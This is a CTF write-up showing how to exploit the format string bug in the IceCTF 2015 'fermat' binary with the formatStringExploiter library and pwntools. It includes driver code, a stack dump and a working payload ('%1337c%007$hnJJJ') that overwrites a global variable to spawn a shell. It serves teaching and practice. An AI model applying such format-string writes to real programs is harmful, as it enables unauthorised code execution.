###################
IceCTF 2015: Fermat
###################

********
Overview
********
The fermat challenge takes in an arugment on the command line, then simply
prints it back out to the console using printf (thus the format string
vulnerability). After printing it out, it checks for the value of a global
variable named ``secret``. If this variable equals the value 1337, then it
gives you a shell.

A difference with this challenge is that, since your input is coming from the
command line argument, ASLR and space make it difficult to utilize that buffer
to provide addresses for your format string vulnerability. It likely still
would have been doable to use that buffer had it not been for the fact that
this application runs once then exits, thus re-randomizing the space. My guess
is that was an intentional design decision.

Example::

  $ ./fermat %x
  ff961fa4


*********
Game Plan
*********
For this challenge, we will set up ``FormatString`` as usual. However, we will
then look at the stack. Finally, we will use ``FormatString`` to write the
required value to the spot in memory.


****************
Step 1: exec_fmt 
****************
The first step in using the ``FormatString`` class is to create an exec_fmt
function. This function will take in any arbitrary input, pass that input into
the application properly, parse the results and return the results back. At
this point, we're not worried about exploiting the vulnerability, we're simply
interacting with the program.

.. code-block:: python

  def exec_fmt(s):
      global p
      print("executing: " + repr(s))
      #  Open up pwntool process class to interact with application
      p = process(["./fermat",s],buffer_fill_size=0xffff)
      # Get the output
      out = p.recvall()
      return out


This one is actually a little bit messy since there's no good way to know ahead
of time if the process will exit or not in an automated manner. That said, we
can take the exploit code generated and run it manually at the end.


*************************
Step 2: Instantiate Class
*************************
Next, we need to instantiate a FormatString class. This can be done strait
forward. To make it simpler, we'll also open an ``ELF`` class on the exe.

.. code-block:: python

  from formatStringExploiter.FormatString import FormatString
  from pwn import *
  
  # Load the binary in pwntools. This way we don't need to worry about the
  # details, just pass it to FormatString
  elf = ELF("./fermat")
  
  # Now, instantiate a FormatString class, using the elf and exec_fmt functions
  fmtStr = FormatString(exec_fmt,elf=elf)

You will see some data scroll. This is the FormatString class attempting to
discover your buffer for you. Notice that in this case ``FormatString`` is
unable to find the buffer. However, during all that scrolling, ``FormatString``
will have figured out enough about the stack to provide us assistance in
exploitation.


*************************
Step 3: Examine the Stack
*************************
This step isn't strictly necessary. At this point, ``FormatString`` understands
the layout of the stack. However, the human running it may not. If you wanted
to, you could jump to step 4 and everything would still work. However, the
stack view is helpful in many cases when you want a quick understanding of what
the stack looks like.

Run the printStack method::

  In [1]: fmtStr.printStack()
  +-------+------------+-------------------------+
  | Index |   Value    |          Guess          |
  +-------+------------+-------------------------+
  |   1   | 0xffb2b574 |                         |
  |   2   | 0xfffb0530 |                         |
  |   3   | 0xf75d2c0b |                         |
  |   4   | 0xf77933dc |                         |
  |   5   | 0x804821c  |                         |
  |   6   | 0x804852b  |                         |
  |   7   | 0x804a02c  |      Symbol: secret     |
  |   8   | 0xf7782000 |                         |
  |   9   | 0xf76c9000 |                         |
  |   10  |    0x0     |                         |
  |   11  | 0xf753c637 |                         |
  |   12  |    0x2     |                         |
  |   13  | 0xffc64a04 |                         |
  |   14  | 0xffb97e20 |                         |
  |   15  |    0x0     |                         |
  |   16  |    0x0     |                         |
  |   17  |    0x0     |                         |
  |   18  | 0xf76ce000 |                         |
  |   19  | 0xf771cc04 |                         |
  |   20  | 0xf77a7000 |                         |
  |   21  |    0x0     |                         |
  |   22  | 0xf775b000 |                         |
  |   23  | 0xf7771000 |                         |
  |   24  |    0x0     |                         |
  |   25  | 0xa2e514a1 |                         |
  |   26  | 0x8da6966  |                         |
  |   27  |    0x0     |                         |
  |   28  |    0x0     |                         |
  |   29  |    0x0     |                         |
  |   30  |    0x2     |                         |
  |   31  | 0x80483b0  |      Symbol: _start     |
  |   32  |    0x0     |                         |
  |   33  | 0xf773ef10 |                         |
  |   34  | 0xf7750780 |                         |
  |   35  | 0xf77ee000 |                         |
  |   36  |    0x2     |                         |
  |   37  | 0x80483b0  |      Symbol: _start     |
  |   38  |    0x0     |                         |
  |   39  | 0x80483d1  |                         |
  |   40  | 0x80484e5  |       Symbol: main      |
  |   41  |    0x2     |                         |
  |   42  | 0xff9b6164 |                         |
  |   43  | 0x8048520  | Symbol: __libc_csu_init |
  |   44  | 0x8048590  | Symbol: __libc_csu_fini |
  |   45  | 0xf76fa780 |                         |
  |   46  | 0xffdc069c |                         |
  |   47  | 0xf7763918 |                         |
  |   48  |    0x2     |                         |
  |   49  | 0xffe17ca4 |                         |
  |   50  | 0xff9bfcad |                         |
  |   51  |    0x0     |                         |
  |   52  | 0xff934cbb |                         |
  |   53  | 0xffdd7cdc |                         |
  |   54  | 0xff86dd10 |                         |
  |   55  | 0xffc48d3c |                         |
  |   56  | 0xffac4d5c |                         |
  |   57  | 0xff91cd7c |                         |
  |   58  | 0xff9fbd91 |                         |
  |   59  | 0xffbe1da3 |                         |
  |   60  | 0xff884db4 |                         |
  |   61  | 0xffafedc2 |                         |
  |   62  | 0xffda015e |                         |
  |   63  | 0xff87a169 |                         |
  +-------+------------+-------------------------+

Notice that up towards the top, ``FormatString`` has identified the symbol
``secret``. This is the symbol that we would like to overwrite with a value.
Since the required pointer is already on the stack, ``FormatString`` can
utilize that pointer for a write without needing it's own buffer offset.


***********************
Step 4: Write the Value
***********************
Let's go ahead and write the required value to this variable. From a user
perspective, the hope is that this is transparent. In this case it indeed is.
You can simply tell ``FormatString`` that you'd like to write to the address of
symbol ``secret`` and give it the value, and in the background it determines
that it can do this through reusing an existing pointer on the stack.

.. code-block:: python

  fmtStr.write_word(elf.symbols['secret'],0x539)

As mentioned above, the exec_fmt function isn't perfect in this case and will
end up killing the new shell before we can access it. Many ways around this,
one simple one is to simply re-use the same format string line that
``FormatString`` used, instead manually. I got this from the output of the
above command::

  %1337c%007$hnJJJ

For example the following would spawn the shell::

  $ ./fermat '%1337c%007$hnJJJ'


*********
Resources
*********
* `fermat <https://github.com/ctfs/write-ups-2015/blob/9b3c290275718ff843c409842d738e6ef3e565fd/icectf-2015/binary/fermat/fermat?raw=true>`_
* `fermat.py <https://raw.githubusercontent.com/Owlz/formatStringExploiter/master/docs/examples/fermat.py>`_
* `fermat github <https://github.com/ctfs/write-ups-2015/tree/9b3c290275718ff843c409842d738e6ef3e565fd/icectf-2015/binary/fermat>`_
